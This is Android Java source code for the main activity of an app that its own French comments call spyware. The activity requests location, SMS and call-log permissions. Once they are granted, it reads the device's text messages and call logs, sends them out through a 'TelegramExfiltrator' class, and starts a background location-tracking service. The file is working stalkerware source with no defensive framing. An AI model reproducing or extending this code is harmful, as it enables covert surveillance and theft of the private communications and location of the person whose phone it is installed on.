package com.ware.spyk;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 101;

    // Toutes les permissions nécessaires pour le spyware
    private static final String[] REQUIRED_PERMISSIONS = new String[]{
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECEIVE_SMS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("MainActivity", "onCreate");
        // Vérifie directement la permission
        if (hasAllPermissions()) {
            Log.d("MainActivity", "Permission accordée, on lance le service"); // Démarre la localisation si déjà accordée
            Log.d("MainActivity", "SMS : " + ComCollector.readSMS(this, null));
            Log.d("MainActivity", "Call Logs : " + ComCollector.readCallLogs(this));
            TelegramExfiltrator.sendTexte(ComCollector.readSMS(this, null));
            TelegramExfiltrator.sendTexte(ComCollector.readCallLogs(this));
            startLocationService();
        } else {
            requestAllPermissions(); // Demande la permission sinon
            Log.d("MainActivity", "Demande de permission");
        }
    }

    private boolean hasLocationPermission() {
        return ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestLocationPermission() {
        ActivityCompat.requestPermissions(
                this,
                new String[]{Manifest.permission.ACCESS_FINE_LOCATION},
                100
        );
    }

    private void requestAllPermissions() {
        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }

    private void startLocationService() {
        Intent intent = new Intent(this, LocalisationService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            Log.d("MainActivity", "Démarrage du service en foreground.");
            startForegroundService(intent); // ✅ Pour Android 8+
        } else {
            startService(intent); // ✅ Pour Android < 8
        }
    }

    // Callback pour gérer la réponse à la demande de permission
    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            @NonNull String[] permissions,
            @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d("MainActivity", "Permission accordée, on lance le service"); // Démarre la localisation si déjà accordée
                Log.d("MainActivity", "SMS : " + ComCollector.readSMS(this, null));
                Log.d("MainActivity", "Call Logs : " + ComCollector.readCallLogs(this));
                TelegramExfiltrator.sendTexte(ComCollector.readSMS(this, null));
                TelegramExfiltrator.sendTexte(ComCollector.readCallLogs(this));
                startLocationService(); // Permission accordée, on lance le service
            } else {
                Log.d("MainActivity", "Permission refusée");
            }
        }
    }
}
